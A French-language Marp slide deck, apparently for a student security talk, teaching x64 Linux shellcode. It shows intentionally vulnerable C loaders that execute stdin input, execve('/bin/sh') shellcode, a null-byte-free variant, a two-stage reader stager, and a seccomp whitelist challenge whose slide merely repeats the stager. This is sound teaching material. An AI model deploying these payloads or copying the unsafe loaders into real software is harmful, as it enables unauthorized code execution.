---
marp: true
theme: default
style: |
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap');
  
  section {
    background-color: #0a0e27;
    color: #ffffff;
    font-family: 'Poppins', sans-serif;
    position: relative;
    overflow: hidden;
  }
  section::before {
    content: '';
    position: absolute;
    top: -100px;
    left: -50px;
    width: 300px;
    height: 300px;
    background: rgba(45, 52, 75, 0.4);
    transform: rotate(15deg);
    z-index: 0;
  }
  section::after {
    content: '';
    position: absolute;
    top: 80px;
    left: 150px;
    width: 400px;
    height: 250px;
    background: rgba(35, 42, 65, 0.3);
    transform: rotate(-10deg);
    z-index: 0;
  }
  h1 {
    text-align: center;
    font-size: 2.4em;
    color: #ffffff;
    font-weight: 800;
    margin-top: 180px;
    letter-spacing: 2px;
    text-transform: uppercase;
    position: relative;
    z-index: 1;
    line-height: 1.2;
  }
  h1 .pink {
    color: #ff6b8a;
  }
  h2 {
    color: #ffffff;
    font-weight: 700;
    border-left: 5px solid #ff6b8a;
    padding-left: 20px;
    margin-top: 50px;
    text-transform: uppercase;
    letter-spacing: 1px;
    position: relative;
    z-index: 1;
  }
  h3 {
    color: #ff6b8a;
    font-weight: 600;
    font-size: 1.1em;
    letter-spacing: 3px;
    text-transform: uppercase;
  }
  h4 {
    color: #4ec9b0;
    font-weight: 600;
    font-size: 0.95em;
    margin-top: 20px;
    margin-bottom: 10px;
  }
  p, li {
    color: #d4d4d4;
    line-height: 1.8;
    font-size: 1.1em;
    position: relative;
    z-index: 1;
  }
  code {
    background: rgba(255, 107, 138, 0.15);
    color: #ff6b8a;
    padding: 3px 8px;
    border-radius: 4px;
    font-size: 0.9em;
    font-family: 'Fira Code', monospace;
  }
  pre {
    background: #1e1e1e;
    padding: 25px;
    border-radius: 8px;
    border-left: 4px solid #ff6b8a;
    position: relative;
    z-index: 1;
    font-size: 0.85em;
    line-height: 1.6;
  }
  pre code {
    background: transparent;
    padding: 0;
    font-family: 'Fira Code', 'Consolas', monospace;
  }
  /* VS Code syntax highlighting */
  pre code {
    color: #d4d4d4;
  }
  pre code .hljs-comment {
    color: #6a9955;
  }
  pre code .hljs-keyword {
    color: #569cd6;
  }
  pre code .hljs-string {
    color: #ce9178;
  }
  pre code .hljs-number {
    color: #b5cea8;
  }
  pre code .hljs-function {
    color: #dcdcaa;
  }
  pre code .hljs-type {
    color: #4ec9b0;
  }
  pre code .hljs-built_in {
    color: #4ec9b0;
  }
  pre code .hljs-variable {
    color: #9cdcfe;
  }
  pre code .hljs-params {
    color: #9cdcfe;
  }
  pre code .hljs-meta {
    color: #569cd6;
  }
  strong {
    color: #ff6b8a;
    font-weight: 700;
  }
  ul, ol {
    margin-left: 30px;
    position: relative;
    z-index: 1;
  }
  hr {
    border: none;
    border-top: 2px solid rgba(255, 107, 138, 0.3);
    margin: 40px 0;
  }
  .whoami-container {
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: relative;
    z-index: 1;
    margin-top: 60px;
    padding: 0 50px;
  }
  .whoami-content {
    flex: 1;
  }
  .whoami-image {
    flex: 0 0 300px;
    text-align: center;
  }
  .whoami-image img {
    width: 250px;
    height: 250px;
    border-radius: 50%;
    border: 5px solid #ff6b8a;
    object-fit: cover;
  }
  .whoami-title {
    font-size: 1.4em;
    color: #ff6b8a;
    font-weight: 700;
    margin-bottom: 10px;
  }
  .whoami-name {
    font-size: 2.2em;
    font-weight: 800;
    margin-bottom: 30px;
  }
  .whoami-item {
    font-size: 1.2em;
    margin: 15px 0;
    color: #d4d4d4;
  }
  .whoami-item strong {
    color: #ffffff;
  }
  a {
    color: #ff6b8a;
    text-decoration: none;
  }
  .asm-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 30px;
    margin-top: 30px;
    position: relative;
    z-index: 1;
  }
  .asm-item {
    background: rgba(20, 25, 45, 0.4);
    padding: 20px;
    border-radius: 8px;
    border-left: 3px solid #ff6b8a;
  }
  .asm-item h3 {
    margin-top: 0;
    margin-bottom: 10px;
  }
  .code-split {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 25px;
    margin-top: 30px;
    position: relative;
    z-index: 1;
  }
  .code-block h3 {
    margin-top: 0;
    margin-bottom: 15px;
    color: #ff6b8a;
  }
  .code-description {
    margin-top: 15px;
    font-size: 0.95em;
    color: #4ec9b0;
    text-align: center;
    font-style: italic;
  }
---

# Deep Dive into the Shellcode World: <span class="pink">Bypassing Modern Protections</span>

---

## Who Am I?

<div class="whoami-container">
  <div class="whoami-content">

**Louis**

Étudiant à **0x41**

Alternant chez **SAFRAN**

Blog: [kiperz.dev](https://kiperz.dev)

Discord: **kiperzzz75**

  </div>
  <div class="whoami-image">
    <img src="pdp.jpg" alt="Photo">
  </div>
</div>

---

## Qu'est-ce qu'un Shellcode ?

**Définition**

Une suite d'instructions en assembleur que le programme va exécuter, généralement suite à l'exploitation d'une vulnérabilité.

---

## Rappel : Assembleur x64

<div class="asm-grid">

<div class="asm-item">

### PUSH
Empile une valeur sur la stack
`push rax`

</div>

<div class="asm-item">

### POP
Dépile une valeur de la stack
`pop rax`

</div>

<div class="asm-item">

### MOV
Copie une valeur d'un registre à un autre
`mov rax, rbx`

</div>

<div class="asm-item">

### XOR
Opération XOR bit à bit (souvent pour mettre à zéro)
`xor rax, rax`

</div>

<div class="asm-item">

### RET
Retourne de la fonction en dépilant l'adresse de retour
`ret`

</div>

</div>

---

## My First Shellcode

<div class="code-split">

<div class="code-block">

### Loader C
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

int main() {
    unsigned char buffer[256];
    
    printf("Entrez votre shellcode : ");
    read(0, buffer, sizeof(buffer));
    
    // Rend la stack exécutable
    void *page = (void *)((unsigned long)buffer & ~0xFFF);
    mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    // Exécute
    void (*func)() = (void (*)())buffer;
    func();
    
    return 0;
}
```

</div>

<div class="code-block">

### Shellcode ASM
```nasm
mov rsi, 0
mov rdx, 0
mov rcx, 0x68732f6e69622f
push rcx
mov rdi, rsp
mov rax, 59
syscall
```

<div class="code-description">execve("/bin/sh", NULL, NULL)</div>

</div>

</div>

---

## Bypass Null Bytes

<style scoped>
pre {
  font-size: 0.45em;
  padding: 15px;
}
h2 {
  margin-top: 30px;
}
</style>
```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

int main() {
    unsigned char buffer[256];
    unsigned char exec_buffer[256];
    
    puts("Entrez votre shellcode : ");
    int n = read(0, buffer, sizeof(buffer));
    
    strncpy((char *)exec_buffer, (char *)buffer, n);
    
    void *page = (void *)((unsigned long)exec_buffer & ~0xFFF);
    mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    void (*func)() = (void (*)())exec_buffer;
    func();
    
    return 0;
}
```
---
## Bypass Null Bytes

**Problème :** `strncpy()` s'arrête au premier `\x00` → shellcode tronqué !

**Solution :** 
<style scoped>
pre {
  font-size: 0.60em;
  padding: 15px;
}
h2 {
  margin-top: 30px;
}
</style>

```nasm
xor rsi, rsi                    ; Remplace mov rsi, 0
xor rdx, rdx                    ; Remplace mov rdx, 0
xor rax, rax                    ; Met rax à 0
mov rdi, 0x68732f2f6e69622f     ; "//bin/sh" (8 bytes)
push rsi                        ; Push 0 (null-terminator)
push rdi                        ; Push la chaîne
mov rdi, rsp                    ; rdi pointe vers la chaîne
mov al, 59                      ; Petit registre
syscall
```

<div class="code-description">execve("//bin/sh", NULL, NULL)</div>

</div>

</div>

---

## Staged Shellcodes

<style scoped>
pre {
  font-size: 0.45em;
  padding: 15px;
}
h2 {
  margin-top: 30px;
}
</style>
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

int main() {
    unsigned char buffer[256];
    
    puts("Entrez votre shellcode : ");
    read(0, buffer, 0x15);
    
    // Rend la stack exécutable
    void *page = (void *)((unsigned long)buffer & ~0xFFF);
    mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    // Exécute
    void (*func)() = (void (*)())buffer;
    func();
    
    return 0;
}
```

---

**Problème :** Le programme ne lit que **22 bytes** (`0x15`) → impossible d'injecter un shellcode `/bin/sh` complet !

**Solution :** Injecter un premier petit shellcode qui va lire notre second shellcode puis sautera dessus pour l'executer 
<style scoped>
pre {
  font-size: 0.60em;
  padding: 15px;
}
h2 {
  margin-top: 30px;
}
</style>

```nasm
xor rax, rax        ; syscall read (rax = 0)
xor rdi, rdi        ; stdin (rdi = 0)
mov rsi, rsp        ; buffer = stack pointer
mov rdx, 0x100      ; lit 256 bytes
syscall             ; read(0, rsp, 256)
jmp rsi             ; saute vers le code lu
```

<div class="code-description">read(stdin, stack, 0x100)</div>

</div>

</div>

---

## Seccomp Whitelist

<style scoped>
pre {
  font-size: 0.25em;
  padding: 15px;
}
.code-split {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 25px;
  margin-top: 20px;
}
.code-block {
  display: flex;
  flex-direction: column;
}
.seccomp-image {
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(20, 25, 45, 0.4);
  border-radius: 8px;
  border-left: 4px solid #ff6b8a;
  padding: 20px;
}
.seccomp-image img {
  max-width: 100%;
  max-height: 400px;
  object-fit: contain;
}
</style>

<div class="code-split">

<div class="code-block">

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>
#include <stddef.h>
#include <sys/syscall.h>

int main() {
    unsigned char buffer[256];

    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 11, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
    };
    
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
    
    puts("Entrez votre shellcode : ");
    read(0, buffer, 0x100);
    
    void *page = (void *)((unsigned long)buffer & ~0xFFF);
    mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    
    void (*func)() = (void (*)())buffer;
    func();
    
    return 0;
}
```

</div>

<div class="seccomp-image">
  <img src="seccomp.png" alt="Seccomp Schema">
</div>

---

**Problème :** Le programme ne permet d'utiliser que le syscall read et munmap

**Solution :** 
<style scoped>
pre {
  font-size: 0.60em;
  padding: 15px;
}
h2 {
  margin-top: 30px;
}
</style>

```nasm
xor rax, rax        ; syscall read (rax = 0)
xor rdi, rdi        ; stdin (rdi = 0)
mov rsi, rsp        ; buffer = stack pointer
mov rdx, 0x100      ; lit 256 bytes
syscall             ; read(0, rsp, 256)
jmp rsi             ; saute vers le code lu
```

<div class="code-description">read(stdin, stack, 0x100)</div>

</div>

</div>

---
